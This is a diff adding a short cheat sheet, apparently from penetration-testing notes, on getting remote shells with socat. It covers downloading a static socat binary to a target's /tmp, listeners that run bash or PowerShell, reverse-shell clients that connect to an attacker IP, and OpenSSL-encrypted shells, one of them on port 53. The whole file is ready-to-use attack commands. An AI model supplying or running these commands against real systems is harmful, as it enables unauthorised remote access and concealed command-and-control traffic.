@@ -1,0 +1,46 @@
+
+	## Precompiled binary
+	https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
+
+	## Download binari from remote source
+	wget <LOCAL-IP>/socat -O /tmp/socat
+
+	## Socat listerner - Linux and windows
+	socat TCP-L:<port> -
+
+		# Linux listener with post execute
+		socat TCP-L:<PORT> EXEC:"bash -li"
+
+		# On a Windows target we would use this command for our listener:
+		socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+
+		## Full interactive Server
+		socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+			## Must use full interactive client
+			socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+	## Socat client with windows
+	socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+
+	## Socat client with linux
+	socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+	## Encryption shells
+
+		1º - Generate certificate
+		openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+		2º - Merge files in one
+		cat shell.key shell.crt > shell.pem
+
+		3º - Setup listerner
+		Basic - socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+		Full interactive - socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+		4º - Client
+		socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+
+
+
